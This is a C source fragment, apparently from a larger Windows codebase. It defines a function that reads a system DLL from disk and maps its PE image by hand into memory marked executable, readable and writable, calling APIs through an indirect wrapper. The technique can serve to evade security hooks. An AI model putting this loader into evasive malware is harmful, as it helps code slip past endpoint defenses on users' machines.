LPVOID loadDLL(char *dllName)
{
    char moduleFilename[MAX_PATH + 1];
    LPVOID ptrLoc = NULL;
    MZHeader mzH2;
    PE_Header peH2;
    PE_ExtHeader peXH2;
    SectionHeader *secHdr2;

    FNC(GetSystemDirectoryA)(moduleFilename, MAX_PATH);
    if((myStrlenA(moduleFilename) + myStrlenA(dllName)) >= MAX_PATH)
        return NULL;

    strncat_s(moduleFilename, MAX_PATH, dllName, MAX_PATH);

    // load this EXE into memory because we need its original Import Hint Table

    HANDLE fp;
    fp = FNC(CreateFileA)(moduleFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if(fp != INVALID_HANDLE_VALUE)
    {
        BY_HANDLE_FILE_INFORMATION fileInfo;
        FNC(GetFileInformationByHandle)(fp, &fileInfo);

        DWORD fileSize = fileInfo.nFileSizeLow;
        if(fileSize)
        {
            LPVOID exePtr = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if(exePtr)
            {
                DWORD read;

                if(FNC(ReadFile)(fp, exePtr, fileSize, &read, NULL) && read == fileSize)
                {
                    if(readPEInfo((char *)exePtr, &mzH2, &peH2, &peXH2, &secHdr2))
                    {
                        int imageSize = calcTotalImageSize(&mzH2, &peH2, &peXH2, secHdr2);

                        ptrLoc = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        //ptrLoc = HeapAlloc(GetProcessHeap(), 0, imageSize);
                        if(ptrLoc)
                        {
                            loadPE((char *)exePtr, &mzH2, &peH2, &peXH2, secHdr2, ptrLoc);
                        }
                    }

                }
                //HeapFree(GetProcessHeap(), 0, exePtr);
                FNC(VirtualFreeEx)(FNC(GetCurrentProcess)(), exePtr, 0, MEM_RELEASE);
            }
        }
        CloseHandle(fp);
    }

    return ptrLoc;
}